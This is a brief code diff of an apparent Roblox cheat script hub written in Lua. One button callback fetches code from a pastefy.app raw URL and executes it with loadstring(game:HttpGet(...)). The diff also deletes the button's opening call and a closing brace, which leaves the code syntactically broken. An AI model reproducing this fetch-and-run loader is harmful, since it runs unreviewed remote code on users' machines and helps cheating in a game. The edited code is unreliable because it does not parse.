@@ -45,13 +45,11 @@ AddButton(Tab1o, {
   end
 })
 
-AddButton(Tab2o, {
-  Name = "lọ vương",
+Name = "lọ vương",
   Callback = function()
     local Settings = {
       JoinTeam = "Pirates";
       Translator = true;
-    }
     loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
   end
 })
